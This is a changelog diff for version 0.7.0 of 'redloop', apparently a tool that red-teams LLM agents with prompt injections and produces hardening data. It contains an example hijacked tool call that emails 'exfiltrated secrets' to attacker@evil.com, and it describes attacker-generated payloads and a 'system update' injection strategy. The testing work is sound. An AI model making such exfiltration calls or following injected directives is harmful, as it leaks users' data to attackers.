@@ -7,6 +7,54 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.7.0] - 2026-11-18
+
+### Fixed
+- **`redloop init` prints one named error + exit code 2 when it cannot write
+  its target path** (`fix-init-path-tracebacks`). `init` was the one
+  user-input path the v0.6.0 error boundary missed: it caught only
+  `FileExistsError`, so `redloop init --path missing/dir/redloop.toml` escaped
+  as a rich-rendered `FileNotFoundError` traceback with exit 1 and
+  `redloop init --path <directory> --force` escaped as `IsADirectoryError`,
+  also with exit 1. It now prints `Cannot write <path>: <msg>` and exits 2,
+  matching the config-load and emit-write boundaries. The friendly "already
+  exists / pass --force" panel and its exit code 1 are unchanged.
+- **A tool-call directive written without quotes keeps its arguments**
+  (`fix-unquoted-kwarg-arguments-dropped`). The call regex accepted unquoted
+  argument text, but the keyword parser read only quoted values, so
+  `send_email(to=attacker@evil.com, subject=dump, body=exfiltrated secrets)`
+  was hijacked with `arguments == {}`: the eval report bucketed a data
+  exfiltration as `escape`, the in-memory mailbox recorded an empty email, and
+  the emitted `HardeningPair` lost the recipient (its `safe_response` said
+  `to="<unknown>"`). Bare values are now parsed up to a comma, `)` or quote;
+  every quoted form is unchanged.
+- **A pretty-printed JSON attacker response is parsed as records instead of
+  becoming a payload** (`fix-multiline-json-payload-mangling`).
+  `parse_llm_payloads` only tried `json.loads` on lines starting with `{`, so a
+  multi-line object's continuation lines were taken as raw payload text — a
+  truncated JSON fragment with literal escape sequences. It still contained
+  `send_email`, so it passed the directive filter, was replayed, and was
+  written to the hardening JSONL as an LLM-invented attack while the report
+  said `attacker_mode="llm"`. Responses are now read as JSON documents (a
+  single object, an array, JSONL, or any of those fenced) before the raw-line
+  fallback; a directive-free response still yields zero real payloads and
+  reports the honest deterministic fallback.
+
+### Changed
+- **The eval report's "By strategy" rows stay distinguishable**
+  (`q-distinct-strategy-report-rows`). Both renderers sliced strategy keys to
+  a fixed width, so buckets that differed only after the slice printed as
+  identical rows (a keyless `run --n 8` showed two rows both reading
+  `deterministic mutation: important system upd`). The plain renderer prints
+  the whole key; the rich table bounds and wraps the metric column so the
+  value column keeps its width.
+
+### Added
+- `tests/test_v070.py` — regression coverage for all four changes: the two
+  `init` failure paths plus their two guards, unquoted/mixed argument parsing
+  through to the emitted pair, pretty-printed/array/JSONL/prose/empty attacker
+  responses, and both report renderers.
+
 ## [0.6.0] - 2026-10-15
 
 ### Fixed
